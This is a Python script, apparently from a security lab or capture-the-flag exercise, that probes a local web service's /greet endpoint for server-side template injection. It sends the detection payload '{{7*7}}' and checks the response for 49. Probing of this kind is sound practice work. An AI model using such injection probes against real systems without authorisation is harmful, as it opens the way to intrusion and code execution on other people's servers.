import requests
import urllib.parse

base_url = "http://127.0.0.1:33162"

# First, test connectivity
print("[DEBUG] Testing connectivity to target...")
try:
    response = requests.get(base_url, timeout=5)
    print(f"[CONNECT] Status: {response.status_code}")
    print(f"[CONNECT] Response length: {len(response.text)}B")
    print(f"[CONNECT] First 200 chars:\n{response.text[:200]}\n")
except Exception as e:
    print(f"[CONNECT ERROR] {e}")

# Now test /greet endpoint specifically
print("\n[DEBUG] Testing /greet endpoint...")
try:
    response = requests.get(f"{base_url}/greet", timeout=5)
    print(f"[GREET] Status: {response.status_code}")
    print(f"[GREET] Response length: {len(response.text)}B")
    print(f"[GREET] Response:\n{response.text}\n")
except Exception as e:
    print(f"[GREET ERROR] {e}")

# Test a very simple SSTI payload
print("\n[DEBUG] Testing simple math payload...")
simple_payload = "{{7*7}}"
encoded = urllib.parse.quote(simple_payload, safe='')
try:
    url = f"{base_url}/greet?name={encoded}"
    print(f"[REQUEST] {url}")
    response = requests.get(url, timeout=5)
    print(f"[RESPONSE] Status: {response.status_code}")
    print(f"[RESPONSE] Body:\n{response.text}\n")
    
    # Check if it worked
    if "49" in response.text:
        print("[!] SUCCESS: SSTI confirmed! Math expression executed.")
    else:
        print("[INFO] No obvious output from SSTI payload")
        
except Exception as e:
    print(f"[ERROR] {e}")
